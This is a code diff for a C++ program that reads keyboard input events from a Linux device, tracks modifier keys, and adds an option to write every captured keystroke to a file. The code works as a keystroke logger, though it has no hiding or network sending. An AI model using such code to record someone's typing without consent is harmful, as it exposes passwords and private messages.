@@ -11,7 +11,10 @@ int main(int argc, char **argv)
   struct input_event ev;
   bool   is_modifier_key, shift_state, alt_state, ctrl_state;
   STATE  state;
+
   std::string key, shift_key;
+  std::ofstream output_file;
+  //std::ostream output;
 
   shift_state = alt_state = ctrl_state = false;
   num_keys = sizeof(keys) / sizeof(*keys);
@@ -28,6 +31,13 @@ int main(int argc, char **argv)
     std::cerr << "could not open device\n";
     return 1;
   }
+
+  // open output file?
+  if (argc == 3) {
+    output_file.open(argv[2], std::ios::out);
+  }
+
+  std::ostream & output = (argc == 3 ? output_file : std::cout);
 
   while (true) {
 
@@ -89,13 +99,14 @@ int main(int argc, char **argv)
             if (shift_key != key)
               key = shift_key;
             else
-              std::cout << "shf_";
+              output << "shf_";
           }
 
-          if (ctrl_state) std::cout << "ctl_";
-          if (alt_state)  std::cout << "alt_";
+          if (ctrl_state) output << "ctl_";
+          if (alt_state)  output << "alt_";
 
-          std::cout << key << " \n";
+          output << key << " \n";
+          output.flush();
         }
       }
       else {
